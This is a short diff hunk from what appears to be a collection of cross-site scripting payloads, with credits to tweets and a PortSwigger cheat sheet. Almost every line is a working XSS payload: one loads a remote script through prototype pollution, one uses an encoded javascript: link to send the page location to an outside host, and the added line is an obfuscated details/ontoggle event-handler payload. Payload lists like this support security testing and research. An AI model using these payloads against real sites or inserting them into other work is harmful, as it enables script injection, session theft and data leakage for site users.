@@ -15,7 +15,7 @@ https://twitter.com/xhzeem/status/1378316651431612422
 https://twitter.com/xhzeem/status/1377992310974218245
 <script>Object.prototype.BOOMR = 1;Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script> -https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 "><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click -@stealthybugs
-
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
  
  
  
